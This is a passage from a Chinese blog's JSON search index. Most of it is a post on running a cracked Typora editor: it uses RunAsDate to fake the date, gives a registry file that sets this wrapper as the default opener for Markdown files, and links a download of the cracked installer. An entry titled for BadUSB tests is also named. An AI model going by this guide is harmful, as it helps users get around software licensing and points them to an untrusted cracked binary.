","date":"2023-05-27","objectID":"/posts/badusb/:0:0","tags":["物理硬件"],"title":"携Badusb进校园的系列测试","uri":"/posts/badusb/"},{"categories":["工具破解/使用"],"content":"本文介绍破解版的使用、便捷化的方法（不修改系统时间不用管理员运行）","date":"2023-05-25","objectID":"/posts/typora%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8/","tags":["工具"],"title":"Markdown编辑器——Typora破解版","uri":"/posts/typora%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8/"},{"categories":["工具破解/使用"],"content":" 摘要 本文介绍破解版使用、便捷化的方法 （不修改系统时间不用管理员运行） 运行并且修改RunAsDate.exe的参数 参数修改如上图即可，Typora(RunAsDate)为你生成的破解版软件名 注册表编辑 将file.ico、RunAsDate.exe、Typora.exe找到并且修改为你自己的路径注意为反斜杠 Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat] [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat\\DefaultIcon] @=\"D:\\\\Typora\\\\resources\\\\assets\\\\file.ico\" [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat\\shell] [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat\\shell\\open] [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat\\shell\\open\\command] @=\"C:\\\\Users\\\\safex\\\\Downloads\\\\runasdate-x64\\\\RunAsDate.exe /movetime 13\\\\02\\\\2020 00:00:00 \\\" D:\\\\Typora\\\\Typora.exe\\\" \\\"%1\\\"\" [HKEY_CLASSES_ROOT\\Applications\\Typora-run.bat\\SupportedTypes] \".md\"=\"\" \".markdown\"=\"\" \".mdown\"=\"\" \".mkd\"=\"\" \".mmd\"=\"\" 修改后去运行Typora-run.bat、Typora-run.reg 设置中修改md文件打开方式 成功 打开md文件，正常启动Typora，则说明破解成功！ 安装包 https://wwme.lanzoum.com/i5Ot40xao6ze ","date":"2023-05-25","objectID":"/posts/typora%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8/:0:0","tags":["工具"],"title":"Markdown编辑器——Typora破解版","uri":"/posts/typora%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8/"}]